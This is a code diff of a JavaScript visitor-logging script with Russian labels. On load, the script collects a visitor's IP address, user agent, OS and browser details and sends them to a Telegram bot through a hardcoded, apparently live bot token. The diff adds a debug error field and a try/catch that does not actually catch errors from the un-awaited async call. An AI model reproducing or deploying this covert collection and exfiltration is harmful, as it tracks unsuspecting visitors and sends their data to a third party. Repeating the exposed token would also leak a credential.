@@ -29,7 +29,7 @@ function getBrowserInfo() {
     };
 }
 
-async function sendDataToTelegram() {
+async function sendDataToTelegram(errorMessage) {
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
     const osName = getOSName();
@@ -62,7 +62,11 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-    `;
+
+<b>[debug]: возможная ошибка:</b>
+${errorMessage}
+(либо ее нету.)
+`;
 
     const token = '7159693608:AAE5eKPnwrQMfw7Dm8ETaJ_rLlYLWjO8hf8';
     const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -79,4 +83,8 @@ async function sendDataToTelegram() {
     });
 }
 
-sendDataToTelegram();
+try {
+    sendDataToTelegram();
+  } catch (error) {
+    sendDataToTelegram(error.message);
+  }
